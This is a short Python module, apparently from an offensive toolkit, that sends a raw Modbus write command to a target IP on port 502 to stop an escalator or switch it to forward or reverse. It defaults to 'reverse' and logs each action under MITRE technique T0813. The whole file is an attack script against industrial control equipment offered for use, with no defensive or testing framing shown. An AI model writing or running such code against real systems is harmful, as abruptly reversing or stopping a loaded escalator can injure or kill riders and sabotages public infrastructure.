#!/usr/bin/env python3
# modules/attacks/escalator_direction_reverser.py

import argparse
import socket
import struct
import json
import os
from datetime import datetime

LOG_FILE = "results/escalator_reversal_log.json"
MITRE_TTP = "T0813"

def log_action(ip, mode):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "action": mode,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_modbus_command(ip, function_code, register, value):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 502))
        payload = struct.pack('>HHHBBHH', 1, 0, 6, 1, function_code, register, value)
        sock.send(payload)
        sock.close()
        return True
    except:
        return False

def reverse_escalator(ip, direction="reverse"):
    if direction == "stop":
        value = 0
    elif direction == "forward":
        value = 1
    else:  # reverse
        value = 2
    success = send_modbus_command(ip, 6, 100, value)
    if success:
        print(f"[✓] Escalator at {ip} set to mode: {direction}")
        log_action(ip, direction)
    else:
        print(f"[!] Failed to control escalator at {ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse or stop escalator via exposed Modbus interface")
    parser.add_argument("--ip", required=True, help="Target escalator control IP")
    parser.add_argument("--mode", choices=["forward", "reverse", "stop"], default="reverse")
    args = parser.parse_args()

    reverse_escalator(args.ip, args.mode)
